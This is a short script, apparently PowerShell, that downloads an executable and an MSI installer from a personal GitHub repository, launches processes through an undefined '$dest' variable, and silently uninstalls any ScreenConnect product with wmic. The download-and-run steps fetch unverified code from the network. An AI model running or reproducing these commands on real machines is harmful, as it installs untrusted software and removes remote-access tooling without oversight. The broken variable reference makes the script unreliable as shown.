Invoke-WebRequest -Uri https://github.com/nightlynx/furry-adventure/raw/main/Agent_Uninstall.exe -Outfile Agent_Uninstall.exe
Invoke-WebRequest -Uri https://github.com/nightlynx/furry-adventure/raw/main/OT-Testing.MSI -Outfile OT-Testing.MSI

powershell.exe start-process -filepath $dest-u
powershell.exe start-process -filepath $dest-a
wmic product where "Name like '%%ScreenConnect%%'" call uninstall /nointeractive
